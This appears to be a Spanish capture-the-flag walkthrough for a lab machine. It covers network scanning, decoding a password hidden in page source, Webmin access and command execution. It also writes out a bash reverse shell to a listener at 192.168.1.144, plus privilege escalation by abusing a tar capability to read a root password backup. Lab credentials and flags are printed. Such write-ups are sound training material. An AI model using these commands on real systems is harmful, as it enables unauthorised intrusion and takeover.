Herramientas:
	- arp-scan
	- ping
	- nmap
	- Visor de codigo del navegador
	- https://www.dcode.fr/brainfuck-language
	- enum4linux
	- nc -lvnp 1234
	- bash -i >/dev/tcp/192.168.1.144/1234 0>&1
	- con getcap -r / 2>dev/null
	- ./tar -cf {nombre fichero} /var/backups/.old_pass.bak

reconocimiento de la red:

![[Reconocimeinto de la red.png]]
Ping a la maquina para ver si hay conectividad y el TTL:
![[Ping y ver TTL.png]]

Conectividad y TTL 64--> maquina LINUX
Nmap:
sudo nmap -p- --open -sS -Pn -sC -sV 192.168.1.136

![[Nmap.png]]

Encontramos los  puertos:
80 con un apache 2.4.51
139 Samba 4.6.2
445 Samba 4.6.2
10000 http webmin miniserv 1.891
20000 http webmin MiniServ 1.830

Accedemos al puerto 80:

![[Web apache 2 por defecto.png]]
web por defecto de Apache 2 en Debian

Vamos a revisar el código fuente:
![[Codigo extraño en el codigo fuente.png]]
nos encontramos con esto:

<!--
don't worry no one will get here, it's safe to share with you my access. Its encrypted :)
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.
-->

por lo que entendemos con el mensaje que :
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.
es un mensaje encriptado

Decodeamos web para decodear este mensaje (https://www.dcode.fr/brainfuck-language):

![[Decode Message.png]]
y obtenemos:
.2uqPEfj3D<P'a-3

Accedemos al puerto 10000:
![[Acceso al puerto 10000.png]]
volvemos a acceder ahora con SSL (según mensaje)
y vemos un panel de Login:
![[Panel de Login.png]]

Revisamos el puerto 20000:
![[Acceso al puerto 20000.png]]
Usamos la herramienta Enum4 Linux:
comando:
enum4linux -a 192.168.1.136 y obtengo este resultado:
![[Enumeracion de usuarios con enun4linux.png]]
Ha obtenido el usuario cyber
vamos a intentar entrar con el usuario cyber y al contraseña obtenida anteriormente en el panel de login:

cyber:.2uqPEfj3D<P'a-3
y accedemos al panel:

![[Panel de mailbox.png]]

hay una opcion en el panel que es para ejecutar comandos:
![[Ejecutamos comandos desde el panel.png]]

de aquí obtenemos la primera flag del usuario:
User flag: 3mp!r3{You_Manage_To_Break_To_My_Secure_Access}

ahora podemos lanzar una reverse bash desde aquí y recibirla en nuestro terminal:
nos ponemos a la escucha:
comando 
nc -lvnp 1234
y en la victima ejecutamos:
bash -i >/dev/tcp/192.168.1.144/1234 0>&1

Y obtenemos acceso:
![[Ejecutar reverse shell.png]]

Obtenemos la reverse Shell:
![[Obtencion de reverse Shell.png]]
volvemos a ver la flag del usuario:
![[User Flag from the machine.png]]


nuestro usuario es cyber
![[User cyber.png]]

hacemos un pequeño tratamiento de la TTY con el comando:
script /dev/null -c bash
![[Tratamiento de la TTY.png]]
tenemos que escalar privilegios:
sudo -l no funciona
![[Escalado sudo -l.png]]

Vemos las capabilities:
con getcap -r / 2>dev/null
![[Capabilitis del usuario.png]]

Y encontramos  que tenemos acceso a tar

![[Fichero backup old oculto.png]]

Encontramos el ficheor oculto en /var/backups con el nombre .old_pass.bak
usamos tar para leerlo

![[Encontramos fichero backups old.png]]

con el comando ./tar -cf {nombre fichero} /var/backups/.old_pass.bak
extraemos
listamos lo extraido:
![[Fichero backup descomprimido.png]]

y obtenemos lo siguiente:
0000600000000000000000000000002114134001114014303 0ustar  rootrootTs&4&YurgtRX(=~h  

Accedemos con la contraseña de root que hemos obtenido:
sudo root:
root:Ts&4&YurgtRX(=~h  

![[Acceso root.png]]
Root flag:
![[Root flag.png]]
3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}




